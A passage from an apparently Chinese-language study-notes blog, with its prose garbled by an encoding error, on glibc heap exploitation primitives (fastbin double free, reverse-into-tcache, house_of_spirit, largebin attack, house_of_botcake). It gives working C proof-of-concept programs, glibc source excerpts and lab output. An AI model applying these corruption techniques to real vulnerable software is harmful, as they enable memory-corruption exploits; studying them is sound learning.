class="built_in">printf</span>(<span class="string">&quot;A:%p\n&quot;</span>,A);</span><br><span class="line">    <span class="built_in">free</span>(A);                    <span class="comment">//return A back to fastbins</span></span><br><span class="line"></span><br><span class="line">    B = <span class="built_in">malloc</span>(<span class="number">0x400</span>);          <span class="comment">//cause a malloc_consolidate , merge A with the topchunk , then malloc B with the same address of A</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;B:%p\n&quot;</span>,B);</span><br><span class="line">    assert(A == B);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(A);                    <span class="comment">//double free A , then B will be free</span></span><br><span class="line"></span><br><span class="line">    C = <span class="built_in">malloc</span>(<span class="number">0x400</span>);          <span class="comment">//malloc C at the same address of B </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;C:%p\n&quot;</span>,C);</span><br><span class="line">    assert(C == B);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./fastbin_dup_consolidate</span><br><span class="line">this <span class="built_in">printf</span> will establish the write buffer</span><br><span class="line">A:<span class="number">0x563058c578e0</span></span><br><span class="line">B:<span class="number">0x563058c578e0</span></span><br><span class="line">C:<span class="number">0x563058c578e0</span></span><br></pre></td></tr></table></figure>



<p>ç‰¹ç‚¹æ˜¯ä¸éœ€è¦<code>calloc</code></p>
<h4 id="reverse-into-tcache"><a href="#reverse-into-tcache" class="headerlink" title="reverse_into_tcache"></a>reverse_into_tcache</h4><p>å¦‚æœ<code>fastbin</code>ä¸­æœ‰å¤šäºä¸€ä¸ªå †å—,<code>tcache</code>ç©º</p>
<p>é‚£ä¹ˆä»è¯¥<code>fastbin</code>ä¸­æ‹¿ä¸€ä¸ªå †å—æ—¶,é¦–å…ˆä¼šæŠŠ<code>tcache</code>å¡«æ»¡,ç„¶åå†ä»<code>tcache</code>ä¸­æ‹¿å‡ºä¸€ä¸ªå †å—æ¥</p>
<p>å¹¶ä¸”<code>fastbin</code>å’Œ<code>tcache</code>éƒ½æ˜¯é“¾æ ˆç»“æ„</p>
<p>è¿™ä¼šå¯¼è‡´<code>fastbin</code>ä¸­çš„å †å—è¿æ¥é¡ºåºåè¿‡æ¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fastbins[idx]-&gt;1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;6-&gt;7</span><br><span class="line"></span><br><span class="line">tcachebins[idx]-&gt;7-&gt;6-&gt;5-&gt;4-&gt;3-&gt;2-&gt;1</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123; </span><br><span class="line">    <span class="type">size_t</span> *tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> *fastbin_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">int</span> usable_size = <span class="number">0x10</span>;</span><br><span class="line">    <span class="type">int</span> chunk_size = ( usable_size + <span class="number">0x10</span> ) | <span class="number">1</span>;</span><br><span class="line">    <span class="type">size_t</span> fake_chunk[<span class="number">7</span>];</span><br><span class="line">    <span class="built_in">memset</span>(fake_chunk,<span class="number">0x3c</span>,<span class="keyword">sizeof</span>(fake_chunk));</span><br><span class="line">    <span class="type">size_t</span> * victim;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;++i)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(usable_size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        fastbin_chunks[i] = <span class="built_in">malloc</span>(usable_size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(fastbin_chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    *fastbin_chunks[<span class="number">0</span>] = ((<span class="type">size_t</span>)fastbin_chunks[<span class="number">0</span>] &gt;&gt; <span class="number">12</span>) ^ ((<span class="type">size_t</span>)&amp;fake_chunk);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(usable_size);     <span class="comment">//empty tcache</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">malloc</span>(usable_size);            <span class="comment">//reverse fastbin into tcache</span></span><br><span class="line">    victim = <span class="built_in">malloc</span>(usable_size);   <span class="comment">//get stack address</span></span><br><span class="line">    assert(victim == (<span class="type">size_t</span>*)&amp;fake_chunk[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc fastbin_reverse_into_tcache.c -o fastbin_reverse_into_tcache -w -g</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./fastbin_reverse_into_tcache</span><br></pre></td></tr></table></figure>

<h4 id="house-of-mind"><a href="#house-of-mind" class="headerlink" title="house_of_mind"></a>house_of_mind</h4><p>ä¸ä¼š</p>
<h4 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h4><p>ä»»æ„å †å—é‡Šæ”¾è¿›å…¥<code>fastbin</code></p>
<p>æ„é€ å‡å †å—æ—¶éœ€è¦æ³¨æ„ç‰©ç†ä¸Šç›¸é‚»çš„ä¸‹ä¸€ä¸ªå †å—çš„<code>prev_size</code>å­—æ®µ</p>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªæ£€æŸ¥</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> fail = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">   of system_mem might result in a false positive.  Redo the test after</span></span><br><span class="line"><span class="comment">   getting the lock.  */</span></span><br><span class="line"><span class="keyword">if</span> (!have_lock)</span><br><span class="line">&#123;</span><br><span class="line">    __libc_lock_lock(av-&gt;mutex);</span><br><span class="line">    fail = (chunksize_nomask(chunk_at_offset(p, size)) &lt;= CHUNK_HDR_SZ || chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem);</span><br><span class="line">    __libc_lock_unlock(av-&gt;mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fail)</span><br><span class="line">    malloc_printerr(<span class="string">&quot;free(): invalid next size (fast)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡æ£€æŸ¥çš„æ¡ä»¶æ˜¯:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.nextchunk.prev_size &gt; chunk_hdr_sz (0x10)</span><br><span class="line">2.nextchunk.prev_size &lt; av-&gt;system_mem (æ•´ä¸ªå †åŒºçš„å¤§å°,å¯èƒ½æ˜¯0x21000)</span><br></pre></td></tr></table></figure>

<p>ä¸éœ€è¦å’Œ<code>fake_chunk.size</code>è®¾ç½®ç›¸åŒ,åªéœ€è¦æ»¡è¶³ä¸Šè¿°ä¸¤ä¸ªæ¡ä»¶å³å¯</p>
<p>å†™ä¸ª<code>poc</code>æ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> *victim;</span><br><span class="line">    <span class="type">size_t</span> *tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> fake_chunk[<span class="number">10</span>];</span><br><span class="line">    <span class="type">size_t</span> *target;</span><br><span class="line">    fake_chunk[<span class="number">0</span>] = <span class="number">0</span>;  <span class="comment">//prev_size</span></span><br><span class="line">    fake_chunk[<span class="number">1</span>] = <span class="number">0x40</span>;  <span class="comment">//size</span></span><br><span class="line">    fake_chunk[<span class="number">9</span>] = <span class="number">0x1145</span>;  <span class="comment">//ç»•è¿‡ä¸¤ä¸ªå®½æ¾çš„æ£€æŸ¥</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    victim = (<span class="type">size_t</span> *)&amp;fake_chunk[<span class="number">2</span>];</span><br><span class="line">    <span class="built_in">free</span>(victim);       <span class="comment">//å°†å †æ ˆä¸Šçš„å‡å †å—é‡Šæ”¾è¿›å…¥fastbin</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;   </span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x30</span>);<span class="comment">//æ¸…ç©ºtcacheä¿è¯ä¸‹ä¸€æ¬¡ä»fastbinä¸­æ‹¿</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x30</span>);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;victim: %p\n&quot;</span>, victim); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target: %p\n&quot;</span>, target);</span><br><span class="line">    assert(target == victim);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc house_of_spirit.c -o house_of_spirit -g -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./house_of_spirit</span><br><span class="line">victim: 0x7ffe53fab090</span><br><span class="line">target: 0x7ffe53fab090</span><br></pre></td></tr></table></figure>



<h3 id="largebins"><a href="#largebins" class="headerlink" title="largebins"></a>largebins</h3><h4 id="ä»»æ„åˆæ³•åœ°å€å†™å †å—åœ°å€"><a href="#ä»»æ„åˆæ³•åœ°å€å†™å †å—åœ°å€" class="headerlink" title="ä»»æ„åˆæ³•åœ°å€å†™å †å—åœ°å€"></a>ä»»æ„åˆæ³•åœ°å€å†™å †å—åœ°å€</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241101205326333.png" alt="image-20241101205326333"></p>
<p>1.é¦–å…ˆå°†<code>0x431</code> é‡Šæ”¾è¿›å…¥<code>largebin</code></p>
<p>2.å‡è®¾æ­¤æ—¶æˆ‘ä»¬æœ‰ä¸€ä¸ª<code>UAF</code> ,ä¿®æ”¹<code>0x431</code>ä»å †å—çš„<code>bk_nextsize</code>æŒ‡é’ˆæŒ‡å‘ç›®æ ‡åœ°å€</p>
<p>3.å°†é‡Šæ”¾<code>0x421</code>é‡Šæ”¾è¿›å…¥<code>largebin</code>,æ­¤æ—¶ç”±äº<code>0x421</code>æ˜¯è¯¥<code>bin</code>ä¸­æœ€å°çš„,å› æ­¤<code>0x421</code>æ”¾å…¥<code>largebin</code>ä¸­ä¸ä¼šæœ‰ä»»ä½•æ£€æŸ¥</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">     victim_index = largebin_index (size);</span><br><span class="line">     bck = bin_at (av, victim_index);</span><br><span class="line">     fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">                 fwd = bck;</span><br><span class="line">                 bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                 victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                 victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                 fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">               &#125;</span><br><span class="line">     mark_bin (av, victim_index);</span><br><span class="line">     victim-&gt;bk = bck;</span><br><span class="line">     victim-&gt;fd = fwd;</span><br><span class="line">     fwd-&gt;bk = victim;</span><br><span class="line">     bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>

<p>å…¶æ•ˆæœå°±æ˜¯<code>target-&gt;fd_nextsize = &amp;chunk_0x421</code></p>
<p><code>0x431</code>çš„<code>fd_nextsize</code>è¿˜æ˜¯é”™è¯¯åœ°æŒ‡å‘è‡ªå·±,è¿™æ˜¯å› ä¸ºä¿®æ”¹è¯¥æŒ‡é’ˆçš„<strong>æœºä¼š</strong>è¢«ç”¨äºä¿®æ”¹<code>target</code>çš„<code>fd_nextsize</code>äº†</p>
<p>å†™ä¸ª<code>poc</code>æ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">//use struct to align automatically</span></span><br><span class="line">    <span class="type">size_t</span> prev_size;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">size_t</span> fd;</span><br><span class="line">    <span class="type">size_t</span> bk;</span><br><span class="line">    <span class="type">size_t</span> fd_nextsize;</span><br><span class="line">    <span class="type">size_t</span> bk_nextsize;</span><br><span class="line">&#125;Target;</span><br><span class="line"></span><br><span class="line">Target target=&#123;</span><br><span class="line">    .prev_size = <span class="number">0</span>,</span><br><span class="line">    .size = <span class="number">0</span>,</span><br><span class="line">    .fd = <span class="number">0</span>,</span><br><span class="line">    .bk = <span class="number">0</span>,</span><br><span class="line">    .fd_nextsize = <span class="number">0</span>,</span><br><span class="line">    .bk_nextsize = <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_target</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;----------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;prev_size: %p\n&quot;</span>, target.prev_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: %p\n&quot;</span>, target.size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd: %p\n&quot;</span>, target.fd);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bk: %p\n&quot;</span>, target.bk);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd_nextsize: %p\n&quot;</span>, target.fd_nextsize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bk_nextsize: %p\n&quot;</span>, target.bk_nextsize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;----------------------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *A;</span><br><span class="line">    <span class="type">size_t</span> *B;</span><br><span class="line">    <span class="type">size_t</span> *gap1;</span><br><span class="line">    <span class="type">size_t</span> *gap2;</span><br><span class="line"></span><br><span class="line">    A = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    gap1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    B = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">    gap2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(A);        <span class="comment">//A first put into unsortedbin</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x430</span>);  <span class="comment">//a larger malloc request cause A then put into largebin</span></span><br><span class="line">    <span class="built_in">free</span>(B);        <span class="comment">//B first put into unsortedbin</span></span><br><span class="line"></span><br><span class="line">    A[<span class="number">3</span>] = &amp;target;</span><br><span class="line">    print_target();</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x430</span>);  <span class="comment">//put B into the same largebin as A</span></span><br><span class="line">    print_target();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc largebin_attack.c -o largebin_attack -w -g</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./largebin_attack</span><br><span class="line">----------------------------------------------</span><br><span class="line">prev_size: (nil)</span><br><span class="line">size: (nil)</span><br><span class="line">fd: (nil)</span><br><span class="line">bk: (nil)</span><br><span class="line">fd_nextsize: (nil)</span><br><span class="line">bk_nextsize: (nil)</span><br><span class="line">----------------------------------------------</span><br><span class="line">----------------------------------------------</span><br><span class="line">prev_size: (nil)</span><br><span class="line">size: (nil)</span><br><span class="line">fd: (nil)</span><br><span class="line">bk: (nil)</span><br><span class="line">fd_nextsize: 0x55ea6d16f6e0</span><br><span class="line">bk_nextsize: (nil)</span><br><span class="line">----------------------------------------------</span><br></pre></td></tr></table></figure>

<p>åŒç†å¯ä»¥å°†å †å—åœ°å€å†™åˆ°å †æ ˆä¸Š</p>
<h3 id="unsortedbin"><a href="#unsortedbin" class="headerlink" title="unsortedbin"></a>unsortedbin</h3><h4 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house_of_botcake"></a>house_of_botcake</h4><p>å½“é‡Šæ”¾çš„å †å—æ²¡æœ‰è¢«<code>tcache</code>æ¥å—(é€šå¸¸å› ä¸º<code>tcache</code>æ»¡äº†),ä¹Ÿæ²¡æœ‰è¢«<code>fastbin</code>æ¥å—(é€šå¸¸æ¯”<code>fastbin</code>ç®¡è¾–èŒƒå›´å¤§),</p>
<p>æ­¤æ—¶å°è¯•å¯¹å †å—å°è¯•<strong>å‘å‰åˆå¹¶å‘ååˆå¹¶</strong></p>
<p>å¦‚æœå‘åä¸´è¿‘<code>topchunk</code>åˆ™ç›´æ¥è¿˜ç»™<code>topchunk</code></p>
<p>å¦‚æœå‘åä¸ä¸´è¿‘<code>topchunk</code>,åˆ™ä¼šæ”¾åˆ°<code>unsortedbin</code>ä¸­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p))</span><br><span class="line">&#123;</span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    free_perturb(chunk2mem(p), size - CHUNK_HDR_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p))</span><br><span class="line">    &#123;</span><br><span class="line">        prevsize = prev_size(p);</span><br><span class="line">        size += prevsize;</span><br><span class="line">        p = chunk_at_offset(p, -((<span class="type">long</span>)prevsize));</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(chunksize(p) != prevsize))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">        unlink_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* consolidate forward */</span></span><br><span class="line">        <span class="keyword">if</span> (!nextinuse)</span><br><span class="line">        &#123;</span><br><span class="line">            unlink_chunk(av, nextchunk);</span><br><span class="line">            size += nextsize;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        bck = unsorted_chunks(av);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">        p-&gt;fd = fwd;</span><br><span class="line">        p-&gt;bk = bck;</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">        &#123;</span><br><span class="line">            p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        bck-&gt;fd = p;</span><br><span class="line">        fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        set_foot(p, size);</span><br><span class="line"></span><br><span class="line">        check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        size += nextsize;</span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        av-&gt;top = p;</span><br><span class="line">        check_chunk(av, 